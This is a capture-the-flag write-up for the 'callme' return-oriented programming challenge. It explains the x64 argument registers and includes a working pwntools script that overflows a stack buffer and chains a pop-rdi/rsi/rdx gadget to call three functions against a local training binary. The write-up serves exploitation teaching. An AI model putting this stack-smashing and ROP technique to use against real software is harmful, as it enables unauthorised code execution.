## Callme
### Writeup

The solution to this challenge is trivial, especially since the challenge description tells us the solution: call 3 functions in order with 3 particular args. The idea behind this is to teach us the relationships between registers and arguments.

In x64, the calling convenion states that the first 6 arguments should be stored in %rdi, %rsi, %rdx, %rcx, %r8, and %r9 (%rdi being arg 1, %rsi, 2 …) with subsequent arguments being put on the stack. This means that for our challenge, we need to find a way to populate registers %rdi, %rsi and %rdx. Luckily we have the following gadget that controls these 3 registers:

> 0x0040093c pop rdi; pop rsi; pop rdx; ret.

Now all we need to do is use that gadget to fill in the required arguments each time before calling the function. The arguments need to be refilled because the functions could modify their contents.

### Exploit
```
#! /bin/env python3
from pwn import *; 
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")

context.log_level = "info"
elf = context.binary = ELF("./callme")
libelf = ELF("./libcallme.so")
p = elf.process()

# these are the required arguments in order
deadbeef = 0xdeadbeefdeadbeef # arg 1 
cafebabe = 0xcafebabecafebabe # arg 2 
d00df00d = 0xd00df00dd00df00d # arg 3

callme_one = 0x00400720
callme_two = 0x00400740
callme_three = 0x004006f0

pop_args = 0x0040093c # pop rdi; pop rsi; pop rdx; ret

stack_smash = b"A" * 40
load_req_args = flat(pop_args, deadbeef, cafebabe, d00df00d)

payload = flat(
    stack_smash, 
    load_req_args, callme_one,
    load_req_args, callme_two,
    load_req_args, callme_three
)

p.recvuntil(b"> ")
p.sendline(payload)
flag = [w for w in p.recvall().split() if w.startswith(b"ROPE{")][0].decode()
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")
```